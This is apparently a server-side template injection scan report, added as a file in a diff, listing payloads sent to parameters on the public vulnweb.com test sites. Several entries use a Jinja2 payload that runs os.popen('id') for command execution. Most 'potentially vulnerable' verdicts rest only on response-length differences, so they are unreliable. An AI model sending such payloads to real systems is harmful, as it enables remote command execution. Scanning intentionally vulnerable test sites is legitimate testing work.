@@ -1,0 +1,80 @@
+SSTI Vulnerability Scan Results
+=======================================
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: {{7*7}}
+Status: Potential SSTI Vulnerability
+Analysis: Mathematical expression evaluated (7*7=49)
+-----------------------------
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=3&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (18060 vs 17856)
+-----------------------------
+
+URL: http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html
+Parameter: NewsAd
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (30626 vs 30422)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: {{7*7}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (2145 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+Parameter: cat
+Payload: {{7*7}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (2145 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+Parameter: cat
+Payload: {{7*7}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (2145 vs 2036)
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+Parameter: cat
+Payload: {{7*7}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (2145 vs 2036)
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
+Parameter: RetURL
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (3416 vs 3176)
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F
+Parameter: RetURL
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (3833 vs 3593)
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml
+Parameter: RetURL
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (3416 vs 3176)
+-----------------------------
+
+URL: http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml
+Parameter: RetURL
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Status: Potential SSTI Vulnerability
+Analysis: POTENTIALLY VULNERABLE: Significant difference in response length (3833 vs 3593)
+-----------------------------
+
